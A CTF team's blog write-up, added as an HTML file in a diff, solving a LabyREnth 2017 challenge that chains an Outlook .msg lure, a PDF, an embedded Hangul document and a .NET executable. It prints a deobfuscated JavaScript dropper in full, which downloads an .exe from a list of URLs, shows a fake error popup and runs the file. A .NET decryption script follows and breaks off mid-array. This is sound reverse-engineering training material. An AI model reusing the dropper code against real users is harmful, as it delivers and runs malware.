@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+       &middot; Rot26
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class="page">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Rot26
+      </a>
+    </div>
+    <p class="lead"></p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/BreizhCTF.html">BreizhCTF</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/Hacklu.html">Hacklu</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/LabyREnth.html">LabyREnth</a>
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  <h1>Members</h1>
+<a href="https://twitter.com/Memoi2001">Fooker</a>
+<a href="https://twitter.com/kalimer0x00">Kalimer0x00</a>
+<a href="https://twitter.com/govlog">Govlog</a>
+<a href="https://twitter.com/maxencedun">Sp4rKy</a>
+
+
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+  
+</div>
+
+    <main class="container">
+      <div class="content">
+  <p>Here we have a .msg file, which is a :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Secret Beach Party Invite.msg: CDFV2 Microsoft Outlook Message
+</code></pre></div></div>
+
+<p>errkkk. So first convert it to .eml with msgconvert.pl:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msgconvert.pl <span class="nt">--verbose</span>   Secret<span class="se">\ </span>Beach<span class="se">\ </span>Party<span class="se">\ </span>Invite.msg
+</code></pre></div></div>
+
+<p>Then open it with your favorite mail software (was Thunderbird here).</p>
+
+<h1 id="first-part">First part</h1>
+
+<h2 id="the-mail">The mail</h2>
+
+<p>You get, inside the mail, some text :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>おはようございます
+ビーチパーティーの招待を受け入れてください。
+hxxp://www.reversing.sg/B3@chP@r7y/
+</code></pre></div></div>
+
+<p>and an attachment secret.invite.pdf.7z that we save.</p>
+
+<p>Google think the text is japanease and translate it to: “Good morning. Please accept the beach party invitation.”.</p>
+
+<h2 id="first-website">First website</h2>
+
+<p>The url displays some javascript animated text. Looking at the source you see a hexdump of what looks like a base64 :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000  57 65 5F 68 61 64 5F 6a 6f 79 2c 5F 77 65 5F 68  |R3JlYXQgc3RhcnQg|
+00000010  61 64 5F 66 75 6e 2c 5F 77 65 5F 68 61 64 5F 73  |aW4gZmluZGluZyB0|
+00000020  65 61 73 6f 6e 73 5F 69 6e 5F 74 68 65 5F 73 75  |aGlzIGNsdWUuICAN|
+00000030  6e 2E 2E 42 75 74 5F 74 68 65 5F 77 69 6e 65 5F  |CldlIGhvcGUgdGhh|
+00000040  61 6e 64 5F 74 68 65 5F 73 6f 6e 67 5F 6c 69 6b  |dCB5b3UgbGlrZSBo|
+00000050  65 5F 74 68 65 5F 73 65 61 73 6f 6e 73 5F 68 61  |dW50aW5nLiANCkFz|
+00000060  76 65 5F 61 6c 6c 5F 67 6f 6e 65 2E 2E 57 65 5F  |IHRoZXJlIGFyZSBz|
+00000070  68 61 64 5F 6a 6f 79 2c 5F 77 65 5F 68 61 64 5F  |ZXZlcmFsIHRoaW5n|
+00000080  66 75 6e 2c 5F 77 65 5F 68 61 64 5F 73 65 61 73  |cyBmb3IgeW91IHRv|
+00000090  6f 6e 73 5F 69 6e 5F 74 68 65 5F 73 75 6e 2E 2E  |IGh1bnQgZm9yLg0K|
+000000a0  42 75 74 5F 74 68 65 5F 77 69 6e 65 5F 61 6e 64  |DQpUaGUgaGludCB0|
+000000b0  5F 74 68 65 5F 73 6f 6e 67 5F 6c 69 6b 65 5F 74  |byBsb2dpbiBpczog|
+000000c0  53 68 69 74 69 73 72 65 61 6c 6c 79 62 72 6f 6b  |DQpvbWd3dGZub2Ji|
+000000d0  63 51 3d 3d                                      |cQ==|
+</code></pre></div></div>
+
+<p>and also a hex string : <code class="highlighter-rouge">676f6f2e676c2f795632744673</code>, which decodes to <code class="highlighter-rouge">goo.gl/yV2tFs</code> which redirects to <a href="http://www.reversing.sg/B3@chP@r7y/Part1.png">first part of the flag</a>.</p>
+
+<h1 id="second-part">Second part</h1>
+
+<p>Nice. Now the base64 is <code class="highlighter-rouge">R3JlYXQgc3RhcnQgaW4gZmluZGluZyB0aGlzIGNsdWUuICANCldlIGhvcGUgdGhhdCB5b3UgbGlrZSBodW50aW5nLiANCkFzIHRoZXJlIGFyZSBzZXZlcmFsIHRoaW5ncyBmb3IgeW91IHRvIGh1bnQgZm9yLg0KDQpUaGUgaGludCB0byBsb2dpbiBpczogDQpvbWd3dGZub2JicQ==</code> , which decodes to :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Great start in finding this clue.
+We hope that you like hunting.
+As there are several things for you to hunt for.
+
+The hint to login is:
+omgwtfnobbq
+</code></pre></div></div>
+
+<p>Ok … Enough with this website</p>
+
+<h2 id="secret-invite">Secret invite</h2>
+
+<p>So in the mail we had some attachment. However, trying to extract it asks for a password. We tried “labyrenth” without any luck.</p>
+
+<p>However, we just got some hint, try “omgwtfnobbq” just in case, and voila.</p>
+
+<p>We get a pdf file. The only text in it (which is an image) says :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Please open attached CNJYY62W.docm file
+</code></pre></div></div>
+
+<p>We didn’t see any docm file yet, so likely it is hidden in the pdf. Let’s see what pdfextract says:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pdfextract secret.invite.pdf
+Extracted 3 PDF streams to <span class="s1">'secret.invite.dump/streams'</span><span class="nb">.</span>
+Extracted 1 scripts to <span class="s1">'secret.invite.dump/scripts'</span><span class="nb">.</span>
+Extracted 1 attachments to <span class="s1">'secret.invite.dump/attachments'</span><span class="nb">.</span>
+Extracted 0 fonts to <span class="s1">'secret.invite.dump/fonts'</span><span class="nb">.</span>
+Extracted 1 images to <span class="s1">'secret.invite.dump/images'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>The script is just a call to a <code class="highlighter-rouge">submarine()</code> func.</li>
+  <li>The image is just the “Please open …” message seen before.</li>
+  <li>The attachment is a … <code class="highlighter-rouge">Hangul (Korean) Word Processor File 5.x</code></li>
+</ul>
+
+<p>Not bad, let’s look at it :)</p>
+
+<h2 id="hangul">Hangul</h2>
+
+<p>Just discovered that
+<a href="https://en.wikipedia.org/wiki/Hangul_(word_processor)">Hangul</a> is a
+“proprietary word processing application […] with specialized support for the
+Korean”.</p>
+
+<p>Well … evince has some ssupport for hwp, so just open it and see some text that I can’t copy :/</p>
+
+<p>Just a quick binwalk / hachoir on the hwp file before I start installing HWP
+editor shows there is a GIF picture. Sadly, it’s just the small version of
+text.</p>
+
+<p>I found hancomoffice-hwpviewer which allowed me to copy the text which translates to :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A good day for you
+
+I attached a secret document that might help us stop Kim JongCracks
+
+goodbye
+Agent K
+</code></pre></div></div>
+
+<p>Ok, so really seems there is something hidden in this hwp file. Looking on the Internet, we can see that some HWP Office version where vulnerable to some exploitation.</p>
+
+<p>Looking at it with oletools, we see :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>oledir secret.invite.dump/attachments/attached_secret.invite.hwp
+oledir 0.51 - http://decalage.info/python/oletools
+OLE directory entries <span class="k">in </span>file secret.invite.dump/attachments/attached_secret.invite.hwp:
+<span class="nt">----</span>+------+-------+----------------------+-----+-----+-----+--------+------
+id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size
+<span class="nt">----</span>+------+-------+----------------------+-----+-----+-----+--------+------
+0   |&lt;Used&gt;|Root   |Root Entry            |-    |-    |1    |15      |4224
+1   |&lt;Used&gt;|Stream |FileHeader            |3    |4    |-    |29      |256
+2   |&lt;Used&gt;|Stream |DocInfo               |12   |6    |-    |1F      |633
+3   |&lt;Used&gt;|Storage|BodyText              |2    |5    |14   |0       |0
+4   |&lt;Used&gt;|Stream |<span class="se">\x</span>05HwpSummaryInformat|-    |-    |-    |17      |457
+    |      |       |ion                   |     |     |     |        |
+5   |&lt;Used&gt;|Stream |PrvImage              |-    |7    |-    |3       |1259
+6   |&lt;Used&gt;|Stream |PrvText               |-    |8    |-    |0       |162
+7   |&lt;Used&gt;|Storage|DocOptions            |-    |-    |11   |0       |0
+8   |&lt;Used&gt;|Storage|Scripts               |-    |-    |9    |0       |0
+9   |&lt;Used&gt;|Stream |JScriptVersion        |10   |-    |-    |30      |13
+10  |&lt;Used&gt;|Stream |DefaultJScript        |-    |-    |-    |2D      |136
+11  |&lt;Used&gt;|Stream |_LinkDoc              |-    |-    |-    |31      |524
+12  |&lt;Used&gt;|Storage|BinData               |-    |-    |13   |0       |0
+13  |&lt;Used&gt;|Stream |BIN0001.OLE           |-    |-    |-    |1E      |59814
+14  |&lt;Used&gt;|Stream |Section0              |-    |-    |-    |3A      |510
+15  |unused|Empty  |                      |-    |-    |-    |0       |0
+</code></pre></div></div>
+
+<p>Playing with olebrowse we can save bin0001.ole and defaultjscript, but can be exploited.</p>
+
+<p>At some point we found http://www.vxsecurity.sg/2016/11/22/technical-teardown-exploit-malware-in-hwp-files/  which pointed us to <a href="http://cerbero.io/profiler/">Cerbero Profiler</a>.
+Thanks, it has a Linux version.</p>
+
+<p>We quickly find that the Javascript is empty (function only contains a “TODO”).
+The ole file seems muuuch better. Let’s save it.</p>
+
+<h2 id="trolljs">Troll.js</h2>
+
+<p>So , in this “bin” file we can see a “troll.js” file which contains lot of javascript. At the end of it, there are some ActiveX Object creation and a powershell command.
+After removing the extra ‘F’ in this line, we see it tries to remove ‘http://www.kimcannotcrack.shit69/non.existant?enkP’ which, sadly, does not exist :()</p>
+
+<p>So, just run this javascript after having removed call to anything suspicious. Especially, comment everything after aSV8(); (ie last few lines) and replace :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">aSV8</span> <span class="o">=</span> <span class="nx">LsIZ</span><span class="p">(</span><span class="nx">lX0vbnD</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>with:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">LsIZ</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">lX0vbnD</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This will give you a new piece of JS code (which is likely eval’ed by <code class="highlighter-rouge">LsIZ</code>):</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getDataFromUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">"MSXML2.XMLHTTP"</span><span class="p">);</span>
+        <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">getData</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="nx">getDataFromUrl</span><span class="p">(</span><span class="s2">"http://r.u.kidding.me69/DAB58154yc/"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">getDataFromUrl</span><span class="p">(</span><span class="s2">"http://shall.we.playctfga.me69/ni95716oSOsA/"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="nx">getDataFromUrl</span><span class="p">(</span><span class="s2">"http://omgwtfbbq.no69/VqCj49674sPnb/"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                                <span class="nx">getDataFromUrl</span><span class="p">(</span><span class="s2">"http://nono.thiscannot.be69/Isb50659TZdS/"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                                        <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+                                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                                        <span class="nx">getDataFromUrl</span><span class="p">(</span><span class="s2">"http://reversing.sg/pdfHWP/part1.flag.exe"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                                            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                                                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+                                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                                                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+                                            <span class="p">}</span>
+                                        <span class="p">});</span>
+                                    <span class="p">}</span>
+                                <span class="p">});</span>
+                            <span class="p">}</span>
+                        <span class="p">});</span>
+                    <span class="p">}</span>
+                <span class="p">});</span>
+            <span class="p">}</span>
+        <span class="p">});</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">getTempFilePath</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">tmpFileName</span> <span class="o">=</span> <span class="s2">"</span><span class="err">\</span><span class="se">\"</span><span class="s2"> + Math.random().toString(36).substr(2, 9) + "</span><span class="p">.</span><span class="nx">exe</span><span class="s2">";
+        var tmpFilePath = fs.GetSpecialFolder(2) + tmpFileName;
+        return tmpFilePath;
+    } catch (error) {
+        return false;
+    }
+}
+
+function saveToTemp(data, callback) {
+    try {
+        var path = getTempFilePath();
+        if (path) {
+            var objStream = new ActiveXObject("</span><span class="nx">ADODB</span><span class="p">.</span><span class="nx">Stream</span><span class="s2">");
+            objStream.Open();
+            objStream.Type = 1;
+            objStream.Write(data);
+            objStream.Position = 0;
+            objStream.SaveToFile(path, 2);
+            objStream.Close();
+            return callback(path, false);
+        } else {
+            return callback(null, true);
+        }
+    } catch (error) {
+        return callback(null, true);
+    }
+}
+getData(function(data, error) {
+    WshShell = WScript.CreateObject("</span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Shell</span><span class="s2">");
+    Text = "</span><span class="nx">There</span> <span class="nx">was</span> <span class="nx">an</span> <span class="nx">error</span> <span class="nx">opening</span> <span class="k">this</span> <span class="nb">document</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">file</span> <span class="nx">is</span> <span class="nx">damaged</span> <span class="nx">and</span> <span class="nx">could</span> <span class="nx">not</span> <span class="nx">be</span> <span class="nx">repaired</span> <span class="p">(</span><span class="k">for</span> <span class="nx">example</span><span class="p">,</span> <span class="nx">it</span> <span class="nx">was</span> <span class="nx">sent</span> <span class="k">as</span> <span class="nx">an</span> <span class="nx">email</span> <span class="nx">attachment</span> <span class="nx">and</span> <span class="nx">was</span> <span class="nx">not</span> <span class="nx">correctly</span> <span class="nx">decoded</span><span class="p">).</span><span class="s2">";
+    Title = "</span><span class="nx">Not</span> <span class="nx">Supported</span> <span class="nx">File</span> <span class="nx">Format</span><span class="s2">";
+    Res = WshShell.Popup(Text, 0, Title, 0 + 64);
+    if (!error) {
+        saveToTemp(data, function(path, error) {
+            if (!error) {
+                try {
+                    var wsh = new ActiveXObject("</span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Shell</span><span class="s2">");
+                    wsh.Run(path);
+                } catch (error) {}
+            }
+        });
+    }
+});
+</span></code></pre></div></div>
+
+<p>So it just tries top get some urls, the only valid one is http://reversing.sg/pdfHWP/part1.flag.exe , which leads us to the next step.</p>
+
+<h2 id="exe-file">Exe file</h2>
+
+<p>So, we got some <code class="highlighter-rouge">PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows </code> file. RE challenge ? maybe not yet …</p>
+
+<p>First check if there is anything interesting in this binary :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hachoir-subfile part1.flag.exe out
+<span class="o">[</span>+] Start search on 450560 bytes <span class="o">(</span>440.0 KB<span class="o">)</span>
+
+<span class="o">[</span>+] File at 0 <span class="nv">size</span><span class="o">=</span>450560 <span class="o">(</span>440.0 KB<span class="o">)</span>: Microsoft Windows Portable Executable: Intel 80386, Windows GUI <span class="o">(</span>don<span class="s1">'t copy whole file)
+[+] File at 21127: FAT32 filesystem
+[+] File at 32041 size=39606 (38.7 KB): JPEG picture =&gt; out/file-0001.jpg
+[+] File at 93266 size=74433 (72.7 KB): JPEG picture =&gt; out/file-0002.jpg
+[+] File at 269885 size=106087 (103.6 KB): JPEG picture =&gt; out/file-0003.jpg
+[+] File at 396033 size=17568 (17.2 KB): JPEG picture =&gt; out/file-0004.jpg
+[+] File at 427024: FAT32 filesystem
+
+[+] End of search -- offset=450560 (440.0 KB)
+Total time: 194 ms -- global rate: 2.2 MB/sec
+</span></code></pre></div></div>
+
+<p>Ah, maybe we’re lucky (remember, we are likely looking for a picture).
+Looking at them, one is invalid, 2 are useless (one saying “At least you tried” :/) and one is only half valid.</p>
+
+<p>As it is a mono binary, we can run <code class="highlighter-rouge">monodis</code> on it.
+A quick look on generated sourcecode shows that some crypto method are used and that, at the end, we have 4 arrays of 88 bytes.
+Also, a few strings are defined :</p>
+
+<ul>
+  <li>4c61627972656e746843544632303137 (which is “LabyrenthCTF2017”)</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>F^&gt;Y!"t</td>
+          <td>fQlcM-z&gt;o@E#^ {y\Q%`pS{YdvcSTd~’Ftf(</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>RE,G pZ_QQt \u007f:S’^BMRXoe xs"oO</td>
+          <td>Y#\u007f^"SXTQ&amp;’!P(</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>LvP"L!@eo:]YPx-Avg~Sm_\u007fx&gt;Fef</td>
+          <td>#`]fq@]T&amp;L&gt;Vcb(</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<p>which are called “szKeyValue”, “szlowkey”, “szmidkey” and “szhighkey”.</p>
+
+<p>Maybe we could try to use them as xor key for the 4 arrays we found. It didn’t help :(
+Look again at the source file, we find a <code class="highlighter-rouge">StringToXOR</code> method which does 2 xor (with 0x25 then 0x58), then xor the result with one of the keys.</p>
+
+<p><em>Note</em>: using ILSpy or snSpy makes much cleaner decompilation ;)</p>
+
+<p>Then, the result is decrypted with the function <code class="highlighter-rouge">Decrypt()</code> which does Rijndael 256/CBC on a base64 string.</p>
+
+<p>If we xor the 4 bytes array with 0x25 then 0x58, we indeed get 4 base64 strings :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0pT4/6YNHPWqQSXJf1q5TFHpFFCq4h32RBQFCvXTKXyewMf/Zw5d9adsoXxPD1lqPTLf/qIclHd3Oyf7/PDCVA==
+OxEy4bGOmIYFDnwCn+Z7B3TvukNvR69zrq8a8R4+BXotqXt6A8qykns1EIo6m4ssd8KdY7JuXEWTaXZdJHDeUw==
+tCfosPPblrYT8g+jaikZgtxMQ6F8V/RDXob1IqyWgMubc/zXNBqk/e5qAMxKcBmIEstQLque4mXAuZ4sivU2EQ==
+YDefqoaex0m0bzSqj9viESQqy6TUCD2XNULyAwHIc2qqSj93ZKszDpQUWkIFEzMTElTXMXcN1hzMD6RI77/xLA==
+</code></pre></div></div>
+
+<p>We also see that Key and IV a re both set to the value of the ‘key’ parameter. That’s enough to reverse our four strings.
+We could have used python or other, but Rijndael 256 is not that common, so let’s have some fun and write our .NET decryption script :</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">ComponentModel</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">;</span>
+
+<span class="n">namespace</span> <span class="n">Doors</span>
+<span class="p">{</span>
+	<span class="n">public</span> <span class="n">class</span> <span class="n">Form1</span>
+	<span class="p">{</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="kt">int</span> <span class="n">iNum</span><span class="p">;</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">szKeyValue</span> <span class="o">=</span> <span class="s">"4c61627972656e746843544632303137"</span><span class="p">;</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">szmidkey</span> <span class="o">=</span> <span class="s">"F^&gt;Y!</span><span class="se">\"</span><span class="s">t|fQlcM-z&gt;o@E#^ {y</span><span class="se">\\</span><span class="s">Q%`pS{YdvcSTd~'Ftf("</span><span class="p">;</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">szlowkey</span> <span class="o">=</span> <span class="s">"RE,G pZ_QQt \u007f:S'^BMRXoe xs</span><span class="se">\"</span><span class="s">oO|Y#\u007f^</span><span class="se">\"</span><span class="s">SXTQ&amp;'!P("</span><span class="p">;</span>
+		<span class="n">public</span> <span class="k">static</span> <span class="n">string</span> <span class="n">szhighkey</span> <span class="o">=</span> <span class="s">"LvP</span><span class="se">\"</span><span class="s">L!@eo:]YPx-Avg~Sm_\u007fx&gt;Fef|#`]fq@]T&amp;L&gt;Vcb("</span><span class="p">;</span>
+
+		<span class="n">public</span> <span class="k">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">MagicMum</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[]</span>
+        <span class="p">{</span>
+            <span class="mi">36</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span 